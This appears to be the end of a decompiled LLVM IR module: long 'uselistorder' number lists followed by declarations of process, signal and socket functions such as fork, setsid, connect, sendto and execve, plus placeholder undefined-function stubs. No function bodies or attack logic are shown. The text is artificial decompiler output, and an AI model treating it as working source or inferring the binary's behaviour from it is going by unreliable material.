1312, 154, 1313, 155, 1314, 220, 1430, 1431, 1432, 1433, 28, 1441, 1442, 29, 1315, 1316, 1253, 99, 1317, 352, 1318, 394, 2159, 395, 316, 2160, 2161, 2163, 2164, 393, 2035, 2037, 2038, 79, 265, 2039, 2036, 2033, 2034, 30, 2017, 2015, 2016, 266, 2040, 2041, 396, 31, 2042, 221, 2018, 2019, 2020, 2021, 2022, 2023, 32, 33, 1425, 1426, 1427, 1428, 397, 34, 398, 2043, 2044, 1225, 1387, 1226, 1993, 1991, 1452, 1334, 2045, 2046, 2047, 222, 2048, 2052, 2053, 2054, 2055, 399, 2056, 2057, 1996, 223, 224, 1842, 400, 317, 1843, 2171, 225, 35, 226, 1695, 1696, 228, 1697, 401, 227, 1698, 113, 36, 1782, 1783, 1699, 1700, 267, 37, 1701, 2049, 2050, 2051, 38, 1914, 1915, 1916, 39, 2177, 2178, 114, 229, 1702, 1703, 1704, 1705, 1706, 1707, 1708, 1709, 1710, 1711, 156, 1712, 1713, 1714, 1715, 1716, 230, 1717, 1719, 1720, 1718, 1721, 157, 1722, 1723, 231, 1724, 232, 301, 402, 1725, 1726, 233, 234, 1727, 1728, 1729, 1730, 1731, 1732, 318, 1733, 1734, 403, 1735, 319, 1737, 239, 1739, 236, 237, 1736, 235, 1738, 1740, 1742, 159, 1743, 1744, 240, 100, 101, 1745, 1746, 158, 404, 1747, 1748, 241, 405, 1749, 1750, 238, 1751, 1752, 1753, 1754, 1755, 1756, 1757, 1758, 1759, 1760, 406, 1762, 128, 106, 1761, 1763, 1764, 1765, 40, 1290, 242, 1291, 139, 102, 117, 1741, 268, 1319, 41, 270, 243, 1321, 1320, 269, 320, 2173, 181, 1410, 1254, 1930, 1434, 2162, 1322, 1845, 1856, 1323, 1798, 2165, 129, 2166, 2060, 2172, 1799, 2061, 2169, 1800, 1450, 1801, 2001, 1324, 1333, 2167, 2168, 42, 2002, 160, 2003, 2004, 253, 252, 1255, 130, 131, 132, 133, 1257, 1256, 81, 80, 161, 2005, 2006, 2007, 2008, 2010, 2009, 43, 1823, 1824, 255, 254, 1258, 134, 135, 136, 137, 1260, 1259, 83, 82, 68, 103, 1825, 1261, 44, 1826, 1827, 138, 1828, 1829, 1830, 1831, 1832, 244, 1262, 1265, 1263, 1264, 1833, 1266, 308, 412, 1325, 413, 271, 414, 1326, 411, 66, 67, 415, 1327, 1328, 416, 421, 422, 507, 508, 84, 321, 407, 408, 409, 322, 410, 1329, 417, 1330, 418, 419, 1331, 420, 1332, 245, 323, 272, 1336, 423, 1335, 425, 426, 424, 427, 428, 1337, 1338, 353, 1339, 429, 1340, 430, 162, 163, 164, 165, 166, 441, 1351, 324, 431, 325, 1352, 1353, 438, 1354, 1357, 439, 1355, 440, 1356, 275, 1358, 1359, 435, 246, 1360, 1363, 436, 1361, 437, 247, 1362, 274, 1364, 442, 1365, 432, 1366, 1369, 433, 1367, 434, 1368, 273, 1370, 443, 1371, 1372, 444, 1373, 1374, 445, 1375, 1376, 1377, 446, 1378, 1379, 1380, 1381, 326, 448, 449, 447, 450, 167, 1388, 309, 1389, 453, 1390, 85, 327, 1391, 1392, 1393, 1400, 452, 1394, 1395, 1396, 1397, 1398, 1399, 276, 1401, 454, 1402, 354, 1403, 1404, 451, 1405, 1406, 1407, 1408, 1409, 248, 1411, 1412, 86, 107, 277, 1267, 1268, 1269, 1270, 1271, 1272, 1273, 1274, 1275, 1276, 1277, 1278, 1279, 1280, 1281, 473, 1282, 474, 1283, 1284, 475, 476, 455, 1285, 477, 472, 282, 283, 463, 1286, 1287, 1288, 464, 1289, 465, 466, 467, 468, 469, 470, 471, 1227, 1435, 280, 281, 456, 457, 458, 459, 460, 461, 462, 278, 279, 478, 479, 1436, 480, 1437, 355, 1438, 1439, 1440, 115, 168, 169, 87, 88, 249, 1443, 328, 329, 330, 331, 487, 1444, 1446, 1447, 1448, 482, 1449, 483, 484, 485, 481, 284, 486, 1445, 356, 489, 490, 488, 332, 45, 492, 491, 493, 1451, 333, 334, 335, 336, 1453, 1454, 496, 494, 495, 285, 1455, 1456, 1457, 250, 1777, 497, 498, 1778, 89, 504, 90, 503, 499, 1779, 502, 287, 505, 500, 1780, 501, 286, 506, 91, 108, 1781, 337, 509, 510, 511, 1785, 512, 1784, 514, 515, 513, 516, 517, 1786, 1787, 357, 1788, 1789, 170, 1790, 92, 358, 1791, 288, 518, 519, 520, 521, 1793, 1794, 310, 1802, 1803, 522, 1804, 523, 1805, 1806, 524, 171, 525, 526, 527, 528, 529, 1817, 172, 93, 294, 289, 340, 341, 1807, 1808, 1809, 290, 338, 339, 342, 1810, 1811, 343, 1812, 1813, 292, 94, 173, 174, 291, 1815, 1816, 359, 175, 95, 530, 1814, 1818, 1819, 344, 531, 532, 533, 1820, 1844, 534, 536, 537, 538, 539, 540, 535, 293, 541, 1846, 1847, 360, 295, 1848, 1849, 345, 346, 347, 348, 2058, 2059, 1292, 1293, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 627, 628, 629, 630, 631, 632, 633, 634, 635, 636, 637, 638, 639, 640, 641, 642, 643, 644, 645, 646, 647, 648, 649, 650, 651, 652, 653, 654, 655, 656, 657, 658, 659, 660, 661, 662, 663, 664, 665, 666, 667, 668, 669, 670, 671, 672, 673, 674, 675, 676, 677, 678, 679, 680, 681, 682, 683, 684, 685, 686, 687, 688, 689, 690, 691, 692, 693, 694, 695, 696, 697, 698, 699, 700, 701, 702, 703, 704, 705, 706, 707, 708, 709, 710, 711, 712, 713, 714, 715, 716, 717, 718, 719, 720, 721, 722, 723, 724, 725, 726, 727, 728, 729, 730, 731, 732, 733, 734, 735, 736, 737, 738, 739, 740, 741, 742, 743, 744, 745, 746, 747, 748, 749, 750, 751, 752, 753, 754, 755, 756, 757, 758, 759, 760, 761, 762, 763, 764, 765, 766, 767, 768, 769, 770, 771, 772, 773, 774, 775, 776, 777, 778, 779, 780, 781, 782, 783, 784, 785, 786, 787, 788, 789, 790, 791, 792, 793, 794, 795, 796, 797, 798, 799, 800, 801, 802, 803, 804, 805, 806, 807, 808, 809, 810, 811, 812, 813, 814, 815, 816, 817, 818, 819, 820, 821, 822, 823, 824, 825, 826, 827, 828, 829, 830, 831, 832, 833, 834, 835, 836, 837, 838, 839, 840, 841, 842, 843, 844, 845, 846, 847, 848, 849, 850, 851, 852, 853, 854, 855, 856, 857, 858, 859, 860, 861, 862, 863, 864, 865, 866, 867, 868, 869, 870, 871, 872, 873, 874, 875, 876, 877, 878, 879, 880, 881, 882, 883, 884, 885, 886, 887, 888, 889, 890, 891, 892, 893, 894, 895, 896, 897, 898, 899, 900, 901, 902, 903, 904, 905, 906, 907, 908, 909, 910, 911, 912, 913, 914, 915, 916, 917, 918, 919, 920, 921, 922, 923, 924, 925, 926, 927, 928, 929, 930, 931, 932, 933, 934, 935, 936, 937, 938, 939, 940, 941, 942, 943, 944, 945, 946, 947, 948, 949, 950, 951, 952, 953, 954, 955, 956, 957, 958, 959, 960, 961, 962, 963, 964, 965, 966, 967, 968, 969, 970, 971, 972, 973, 974, 975, 976, 977, 978, 979, 980, 981, 982, 983, 984, 985, 986, 987, 988, 989, 990, 991, 992, 993, 994, 995, 996, 997, 998, 999, 1000, 1001, 1002, 1003, 1004, 1005, 1006, 1007, 1008, 1009, 1010, 1011, 1012, 1013, 1014, 1015, 1016, 1017, 1018, 1019, 1020, 1021, 1022, 1023, 1024, 1025, 1026, 1027, 1028, 1029, 1030, 1031, 1032, 1033, 1034, 1035, 1036, 1037, 1038, 1039, 1040, 1041, 1042, 1043, 1044, 1045, 1046, 1047, 1048, 1049, 1050, 1051, 1052, 1053, 1054, 1055, 1056, 1057, 1058, 1059, 1060, 1061, 1062, 1063, 1064, 1065, 1066, 1067, 1068, 1069, 1070, 1071, 1072, 1073, 1074, 1075, 1076, 1077, 1078, 1079, 1080, 1081, 1082, 1083, 1084, 1085, 1086, 1087, 1088, 1089, 1090, 1091, 1092, 1093, 1094, 1095, 1096, 1097, 1098, 1099, 1100, 1101, 1102, 1103, 1104, 1105, 1106, 1107, 1108, 1109, 1110, 1111, 1112, 1113, 1114, 1115, 1116, 1117, 1118, 1119, 1120, 1121, 1122, 1123, 1124, 1125, 1126, 1127, 1128, 1129, 1130, 1131, 1132, 1133, 1134, 1135, 1136, 1137, 1138, 1139, 1140, 1141, 1142, 1143, 1144, 1145, 1146, 1147, 1148, 1149, 1150, 1151, 1152, 1153, 1154, 1155, 1156, 1157, 1158, 1159, 1160, 1161, 1162, 1163, 1164, 1165, 1166, 1167, 1168, 1169, 1170, 1171, 1172, 1173, 1174, 1175, 1176, 1177, 1178, 1179, 1180, 1181, 1182, 1183, 1184, 1185, 1186, 1187, 1188, 1189, 1190, 1191, 1192, 1193, 1194, 1195, 1196, 1197, 1198, 1199, 1200, 1201, 1202, 1203, 1204, 1205, 1206, 1207, 1208, 1209, 1210, 1211, 1212, 1213, 1214, 1215, 1216, 1217, 1218, 1219, 1220, 1221, 1222, 2179, 2180, 2181, 2182, 2183, 2184, 2185, 2186, 2187, 2188, 2189, 2190, 2191, 2192, 2193 }
  uselistorder i32* @r4, { 80, 600, 229, 10, 230, 231, 232, 233, 234, 235, 236, 237, 238, 239, 81, 82, 240, 83, 241, 242, 243, 244, 245, 246, 247, 248, 249, 250, 251, 252, 389, 390, 11, 391, 392, 393, 394, 395, 396, 12, 397, 398, 399, 400, 401, 402, 403, 404, 405, 406, 407, 408, 409, 412, 413, 414, 415, 5, 416, 417, 4, 418, 419, 420, 14, 421, 13, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 15, 432, 433, 434, 437, 440, 441, 442, 443, 444, 435, 436, 438, 439, 16, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 460, 459, 461, 462, 463, 464, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 17, 19, 97, 18, 98, 101, 99, 100, 465, 466, 467, 468, 2, 469, 470, 471, 472, 473, 474, 475, 478, 476, 477, 40, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 502, 503, 504, 505, 506, 20, 507, 508, 253, 254, 255, 509, 510, 511, 512, 513, 514, 515, 21, 516, 22, 517, 518, 519, 520, 521, 522, 523, 256, 257, 258, 259, 260, 261, 524, 525, 526, 527, 528, 529, 23, 24, 530, 531, 532, 604, 607, 608, 534, 533, 536, 535, 7, 538, 537, 539, 6, 540, 541, 542, 543, 544, 545, 25, 546, 547, 550, 551, 554, 555, 556, 559, 568, 569, 570, 571, 160, 161, 162, 163, 164, 165, 262, 263, 264, 265, 266, 267, 268, 609, 610, 269, 270, 271, 272, 273, 274, 275, 611, 612, 613, 614, 615, 616, 617, 618, 619, 620, 621, 622, 623, 624, 625, 626, 26, 27, 363, 45, 46, 276, 351, 352, 353, 28, 354, 355, 356, 357, 29, 358, 359, 360, 30, 361, 362, 277, 278, 279, 280, 8, 281, 0, 282, 283, 31, 493, 494, 495, 498, 499, 284, 1, 372, 373, 572, 573, 179, 627, 628, 629, 630, 374, 375, 631, 376, 377, 632, 32, 633, 634, 635, 636, 650, 651, 652, 655, 43, 663, 41, 645, 646, 647, 648, 649, 637, 638, 639, 180, 181, 182, 183, 184, 185, 186, 187, 640, 641, 148, 149, 188, 189, 190, 191, 192, 193, 200, 102, 103, 104, 105, 106, 107, 108, 109, 110, 201, 202, 203, 204, 205, 216, 217, 112, 206, 207, 208, 111, 113, 218, 219, 220, 644, 574, 575, 560, 576, 33, 34, 577, 578, 579, 580, 581, 582, 561, 562, 563, 564, 565, 566, 567, 194, 195, 196, 197, 198, 199, 583, 584, 585, 586, 166, 167, 552, 553, 548, 549, 227, 228, 146, 147, 587, 588, 589, 590, 591, 592, 593, 35, 594, 595, 596, 597, 598, 599, 384, 385, 36, 386, 364, 365, 656, 657, 658, 47, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 319, 318, 320, 321, 322, 323, 324, 325, 326, 37, 327, 328, 329, 335, 336, 337, 338, 3, 339, 340, 341, 342, 343, 344, 345, 38, 346, 39, 347, 348, 349, 350, 76, 77, 78, 330, 332, 331, 333, 334, 500, 501, 114, 44, 115, 116, 117, 118, 119, 120, 121, 122, 42, 123, 659, 660, 661, 662, 172, 173, 174, 175, 496, 497, 209, 210, 642, 643, 9, 124, 125, 387, 388, 410, 411, 126, 127, 378, 379, 602, 603, 380, 381, 605, 606, 653, 654, 221, 222, 382, 383, 557, 558, 128, 129, 144, 145, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 143, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 168, 169, 170, 171, 176, 177, 178, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 211, 212, 213, 214, 215, 223, 224, 225, 226, 366, 367, 368, 369, 370, 371, 79, 601 }
}

declare i32 @unknown_0() local_unnamed_addr

declare i32 @vfork() local_unnamed_addr

declare i32 @fork() local_unnamed_addr

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr

declare void @exit(i32) local_unnamed_addr

declare i32 @close(i32) local_unnamed_addr

declare i32 @getpid() local_unnamed_addr

declare i32 @open(i8*, i32, ...) local_unnamed_addr

declare i32 @pipe([2 x i32]) local_unnamed_addr

declare i32 @read(i32, i32*, i32) local_unnamed_addr

declare i32 @setsid() local_unnamed_addr

declare i32 @sigprocmask(i32, %_TYPEDEF_sigset_t*, %_TYPEDEF_sigset_t*) local_unnamed_addr

declare i32 @time(i32*) local_unnamed_addr

declare i32 @write(i32, i32*, i32) local_unnamed_addr

declare i32 @connect(i32, %sockaddr*, i32) local_unnamed_addr

declare i32 @getsockname(i32, %sockaddr*, i32*) local_unnamed_addr

declare i32 @recv(i32, i32*, i32, i32) local_unnamed_addr

declare i32 @send(i32, i32*, i32, i32) local_unnamed_addr

declare i32 @sendto(i32, i32*, i32, i32, %sockaddr*, i32) local_unnamed_addr

declare i32 @setsockopt(i32, i32, i32, i32*, i32) local_unnamed_addr

declare i32 @sigreturn(%sigcontext*) local_unnamed_addr

declare i32 @sigaction(i32, %sigaction*, %sigaction*) local_unnamed_addr

declare i32 @execve(i8*, [1 x i8*], [1 x i8*]) local_unnamed_addr

declare i32 @nanosleep(%timespec*, %timespec*) local_unnamed_addr

declare i32 @brk(i32*) local_unnamed_addr

declare i32 @poll(%pollfd*, i32, i32) local_unnamed_addr

declare i32 @__decompiler_undefined_function_0() local_unnamed_addr

declare i8 @__decompiler_undefined_function_1() local_unnamed_addr

declare i8* @__decompiler_undefined_function_2() local_unnamed_addr

declare i8** @__decompiler_undefined_function_3() local_unnamed_addr

; Function Attrs: nounwind readnone
declare i32 @llvm.bswap.i32(i32) #1

declare float @fabsf(float)

attributes #0 = { noreturn }
attributes #1 = { nounwind readnone }
